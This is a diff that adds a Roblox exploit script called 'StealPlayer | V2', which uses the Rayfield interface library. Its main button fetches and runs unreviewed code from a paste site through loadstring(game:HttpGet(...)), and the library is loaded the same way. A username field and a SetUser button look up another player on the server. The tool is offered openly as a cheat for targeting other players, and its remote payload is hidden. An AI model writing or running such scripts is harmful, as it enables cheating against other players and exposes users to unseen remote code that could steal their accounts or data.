@@ -1,0 +1,94 @@
+local Rayfield = loadstring(game:HttpGet("https://raw.githubusercontent.com/SiriusSoftwareLtd/Rayfield/main/source.lua"))()
+
+local Players = game:GetService("Players")
+
+local Window = Rayfield:CreateWindow({
+    Name = "StealPlayer | V2",
+    LoadingTitle = "Loading...",
+    LoadingSubtitle = "Please wait...",
+    ConfigurationSaving = {
+        Enabled = false,
+        FolderName = nil,
+        FileName = nil,
+    },
+    KeySystem = false
+})
+
+-- Tabs
+local MainTab = Window:CreateTab("Main", 4483362458)
+local CreditsTab = Window:CreateTab("Credits", 4483362458)
+
+local UserInputValue = ""
+
+-- StealPlayer Button
+MainTab:CreateButton({
+    Name = "StealPlayer",
+    Callback = function()
+        local success, err = pcall(function()
+            loadstring(game:HttpGet("http://vpaste.net/fCXtS"))()
+        end)
+        if success then
+            Rayfield:Notify({
+                Title = "Success",
+                Content = "Script executed successfully!",
+                Duration = 3,
+                Image = 4483362458
+            })
+        else
+            Rayfield:Notify({
+                Title = "Error",
+                Content = "Failed to execute script.",
+                Duration = 3,
+                Image = 4483362458
+            })
+        end
+    end
+})
+
+-- Input for Username
+MainTab:CreateInput({
+    Name = "User",
+    PlaceholderText = "Enter DisplayName or UserName",
+    RemoveTextAfterFocusLost = false,
+    Callback = function(value)
+        UserInputValue = value
+    end
+})
+
+-- SetUser Button
+MainTab:CreateButton({
+    Name = "SetUser",
+    Callback = function()
+        local playerFound = false
+        local playerInfo
+
+        for _, player in pairs(Players:GetPlayers()) do
+            if player.DisplayName:lower() == UserInputValue:lower() or player.Name:lower() == UserInputValue:lower() then
+                playerFound = true
+                playerInfo = player.Name
+                break
+            end
+        end
+
+        if playerFound then
+            Rayfield:Notify({
+                Title = "Success",
+                Content = "Player has been found",
+                Duration = 3,
+                Image = 4483362458
+            })
+        else
+            Rayfield:Notify({
+                Title = "Not Found",
+                Content = "Player has not been found",
+                Duration = 3,
+                Image = 4483362458
+            })
+        end
+    end
+})
+
+-- Credits Tab
+CreditsTab:CreateLabel("StealPlayer | V2")
+CreditsTab:CreateLabel("Made by: madgekoy2")
+CreditsTab:CreateLabel("Special thanks to: Rayfield")
